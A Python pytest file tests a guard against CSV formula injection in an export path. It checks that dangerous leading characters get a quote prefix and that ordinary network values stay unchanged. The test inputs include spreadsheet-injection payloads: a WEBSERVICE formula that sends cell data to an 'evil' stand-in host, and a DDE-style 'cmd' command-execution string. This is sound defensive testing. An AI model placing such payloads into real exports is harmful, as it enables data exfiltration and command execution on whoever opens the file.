"""Tests for the CSV formula-injection guard in the export path.

OWASP "CSV injection": a free-text field (device name, description,
notes...) starting with `=`, `+`, `-`, `@`, tab or CR executes as a
formula when the operator opens the export in Excel / LibreOffice /
Google Sheets. Every cell is neutralised at the single `_line` choke
point, so entity exports, the audit export and the ZIP bundle are all
covered.
"""

from __future__ import annotations

import csv
import io

import pytest

from app.services.csv_export import _line, _sanitize_cell


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ('=WEBSERVICE("http://evil/?"&A1)', "'=WEBSERVICE(\"http://evil/?\"&A1)"),
        ("=1+2", "'=1+2"),
        ("+33 1 23 45 67 89", "'+33 1 23 45 67 89"),
        ("-2+3+cmd|' /C calc'!A0", "'-2+3+cmd|' /C calc'!A0"),
        ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
        ("\t=HYPERLINK(...)", "'\t=HYPERLINK(...)"),
        ("\r=cmd", "'\r=cmd"),
    ],
)
def test_sanitize_prefixes_formula_cells(raw: str, expected: str) -> None:
    assert _sanitize_cell(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        "",  # empty cells stay empty (the common case for optional columns)
        "10.0.0.0/24",  # CIDR
        "192.168.1.10",  # IP
        "2001:db8::1",  # IPv6
        "aa:bb:cc:dd:ee:ff",  # MAC
        "SW-CORE-01",  # device / switch name
        "2026-07-28T10:00:00+00:00",  # ISO timestamp (audit export)
        "42",  # numeric column rendered as text
        "true",  # boolean column
        '{"name": "HQ"}',  # audit `changes` JSON
        "salle réseau — étage 2",  # ordinary free text
    ],
)
def test_sanitize_leaves_legitimate_values_unchanged(raw: str) -> None:
    assert _sanitize_cell(raw) == raw


def test_line_sanitizes_every_cell_but_preserves_csv_shape() -> None:
    buf = io.StringIO()
    writer = csv.writer(buf, delimiter=";", quoting=csv.QUOTE_MINIMAL)
    out = _line(writer, buf, ["SW-01", "=HYPERLINK(\"http://evil\")", "10.0.0.0/24"])

    parsed = next(csv.reader(io.StringIO(out), delimiter=";"))
    assert parsed == ["SW-01", "'=HYPERLINK(\"http://evil\")", "10.0.0.0/24"]


def test_line_header_rows_pass_unchanged() -> None:
    buf = io.StringIO()
    writer = csv.writer(buf, delimiter=";", quoting=csv.QUOTE_MINIMAL)
    out = _line(writer, buf, ["cidr", "gateway", "description"])
    assert out.rstrip("\r\n") == "cidr;gateway;description"
